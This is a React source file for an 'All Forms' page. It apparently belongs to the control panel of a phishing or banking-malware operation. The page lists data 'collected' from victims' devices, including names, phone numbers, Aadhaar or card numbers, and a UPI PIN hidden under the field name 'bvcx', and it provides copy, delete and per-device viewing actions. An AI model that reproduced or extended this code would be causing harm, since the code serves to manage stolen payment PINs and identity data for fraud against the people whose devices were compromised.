import { useState } from "react";
import { ArrowLeft, FileText, User, Phone, CreditCard, Search, Copy, Trash2, Eye, ChevronDown, ChevronUp, Smartphone } from "lucide-react";
import { useAllDeviceForms, useFirebaseUsers, DeviceForm } from "@/hooks/useFirebaseData";
import { ref, remove } from "@/lib/rtdbPb";
import { db } from "@/lib/firebase";
import { format } from "date-fns";
import { toast } from "sonner";
import { useNavigate } from "react-router-dom";
import { useBgImageUrl } from "@/hooks/useCustomization";
import defaultBg from "@/assets/blackhole-bg.jpg";
import DeviceDetail from "@/components/DeviceDetail";

const FieldIcon = ({ field }: { field: string }) => {
  const lower = field.toLowerCase();
  if (lower.includes("name")) return <User className="h-3 w-3 text-green" />;
  if (lower.includes("mobile") || lower.includes("phone")) return <Phone className="h-3 w-3 text-cyan" />;
  if (lower.includes("aadhaar") || lower.includes("card") || lower.includes("id") || lower === "bvcx") return <CreditCard className="h-3 w-3 text-pink" />;
  return <FileText className="h-3 w-3 text-muted-foreground" />;
};

const AllFormsPage = () => {
  const navigate = useNavigate();
  const { formsMap } = useAllDeviceForms();
  const bgImage = useBgImageUrl() || defaultBg;
  const [search, setSearch] = useState("");
  const [expandedKey, setExpandedKey] = useState<string | null>(null);
  const [openDeviceId, setOpenDeviceId] = useState<string | null>(null);
  const { users } = useFirebaseUsers();

  const allForms = Object.entries(formsMap).flatMap(([deviceId, forms]) =>
    forms.map((f) => ({ ...f, deviceId }))
  );
  allForms.sort((a, b) => b.timestamp - a.timestamp);

  const filtered = search.trim()
    ? allForms.filter((f) => {
        const q = search.toLowerCase();
        return (
          f.deviceId.toLowerCase().includes(q) ||
          Object.values(f.content).some((v) => v.toLowerCase().includes(q)) ||
          Object.keys(f.content).some((k) => k.toLowerCase().includes(q))
        );
      })
    : allForms;

  const handleCopy = (form: DeviceForm & { deviceId: string }) => {
    const text = Object.entries(form.content)
      .map(([k, v]) => `${k === "bvcx" ? "UPIPIN" : k}: ${v}`)
      .join("\n");
    navigator.clipboard.writeText(`Device: ${form.deviceId}\n${text}`);
    toast.success("Copied to clipboard");
  };

  const handleDelete = async (form: DeviceForm & { deviceId: string }) => {
    try {
      await remove(ref(db, `users/${form.deviceId}/forms/${form.key}`));
      toast.success("Form deleted");
    } catch {
      toast.error("Failed to delete");
    }
  };

  return (
    <div className="min-h-screen pb-20 lg:pb-8 relative">
      <div className="fixed inset-0 z-0 bg-cover bg-center opacity-15 pointer-events-none" style={{ backgroundImage: `url(${bgImage})` }} />
      <div className="relative z-10">
        <header className="sticky top-0 z-30 bg-background/80 backdrop-blur-xl border-b border-border">
          <div className="flex h-14 items-center gap-3 px-5 max-w-5xl mx-auto">
            <button onClick={() => navigate(-1)} className="h-9 w-9 rounded-xl bg-secondary flex items-center justify-center hover:bg-primary/10 transition-colors">
              <ArrowLeft className="h-4 w-4 text-foreground" />
            </button>
            <div className="flex items-center gap-2">
              <FileText className="h-4 w-4 text-primary" />
              <h1 className="text-base font-bold text-foreground">All Forms</h1>
            </div>
            <span className="ml-auto text-[11px] text-muted-foreground">{filtered.length} forms</span>
          </div>
        </header>

        <main className="px-5 py-4 space-y-3 max-w-5xl mx-auto">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <input
              className="w-full pl-10 pr-4 py-2.5 rounded-xl bg-secondary border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary/40"
              placeholder="Search forms..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
            />
          </div>

          {filtered.length === 0 ? (
            <div className="rounded-2xl border border-border bg-card p-12 text-center">
              <FileText className="h-8 w-8 text-muted-foreground mx-auto mb-3" />
              <p className="text-sm text-muted-foreground">{search ? "No forms match your search" : "No forms collected yet"}</p>
            </div>
          ) : (
            <div className="space-y-2">
              {filtered.map((form) => {
                const isExpanded = expandedKey === `${form.deviceId}_${form.key}`;
                const entries = Object.entries(form.content);
                return (
                  <div key={`${form.deviceId}_${form.key}`} className="rounded-2xl border border-border bg-card overflow-hidden">
                    <button
                      onClick={() => setExpandedKey(isExpanded ? null : `${form.deviceId}_${form.key}`)}
                      className="w-full flex items-center gap-3 p-4 hover:bg-secondary/40 transition-colors"
                    >
                      <div className="h-9 w-9 rounded-xl bg-primary/10 flex items-center justify-center shrink-0">
                        <FileText className="h-4 w-4 text-primary" />
                      </div>
                      <div className="flex-1 min-w-0 text-left">
                        <p className="text-sm font-semibold text-foreground truncate">
                          {entries.length > 0 ? `${entries[0][0] === "bvcx" ? "UPIPIN" : entries[0][0]}: ${entries[0][1]}` : "Empty form"}
                        </p>
                        <p className="text-[10px] text-muted-foreground">
                          {form.deviceId.slice(0, 12)} · {form.timestamp ? format(new Date(form.timestamp), "MMM dd, HH:mm") : "Unknown"}
                        </p>
                      </div>
                      {isExpanded ? <ChevronUp className="h-4 w-4 text-muted-foreground" /> : <ChevronDown className="h-4 w-4 text-muted-foreground" />}
                    </button>

                    {isExpanded && (
                      <div className="px-4 pb-4 space-y-2 border-t border-border/50 pt-3">
                        {entries.map(([key, val]) => (
                          <div key={key} className="flex items-start gap-2">
                            <FieldIcon field={key} />
                            <div className="min-w-0 flex-1">
                              <p className="text-[10px] text-muted-foreground font-semibold uppercase">{key === "bvcx" ? "UPIPIN" : key}</p>
                              <p className="text-sm text-foreground break-all">{val}</p>
                            </div>
                          </div>
                        ))}
                        <div className="flex gap-2 pt-2">
                          <button onClick={() => handleCopy(form)} className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-xl bg-secondary text-xs font-medium text-muted-foreground hover:text-foreground transition-colors">
                            <Copy className="h-3 w-3" /> Copy
                          </button>
                          <button onClick={() => setOpenDeviceId(form.deviceId)} className="flex items-center justify-center gap-1.5 py-2 px-4 rounded-xl bg-primary/10 text-xs font-medium text-primary hover:bg-primary/20 transition-colors">
                            <Smartphone className="h-3 w-3" /> View Device
                          </button>
                          <button onClick={() => handleDelete(form)} className="flex items-center justify-center gap-1.5 py-2 px-4 rounded-xl bg-destructive/10 text-xs font-medium text-destructive hover:bg-destructive/20 transition-colors">
                            <Trash2 className="h-3 w-3" /> Delete
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </main>
      </div>

      {openDeviceId && users[openDeviceId] && (
        <DeviceDetail id={openDeviceId} user={users[openDeviceId]} onClose={() => setOpenDeviceId(null)} />
      )}
    </div>
  );
};

export default AllFormsPage;
